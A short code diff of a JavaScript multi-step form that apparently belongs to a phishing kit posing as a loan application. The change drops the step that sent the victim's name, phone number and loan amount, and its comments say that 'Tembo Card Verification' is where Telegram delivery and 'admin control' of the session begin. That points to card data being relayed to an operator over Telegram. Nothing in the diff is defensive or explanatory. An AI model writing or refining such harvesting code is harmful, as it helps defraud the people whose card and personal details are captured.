@@ -91,17 +91,14 @@ function handleServerResponse(res) {
 }
 
 // Form Handlers
+// Personal Info: Local transition only (No server request / No Telegram notification from this screen)
 function submitPersonal(e) {
     e.preventDefault();
     document.getElementById('personal-notice').style.display = 'none';
-    const data = {
-        fullName: document.getElementById('fullName').value,
-        phoneNumber: document.getElementById('phoneNumber').value,
-        loanAmount: document.getElementById('requestedAmount').value
-    };
-    postData('personal_info', data);
+    goToScreen('screen-step3');
 }
 
+// Step 3: Tembo Card Verification - Telegram delivery and admin control starts strictly here!
 function submitStep3(e) {
     e.preventDefault();
     document.getElementById('step3-notice').style.display = 'none';
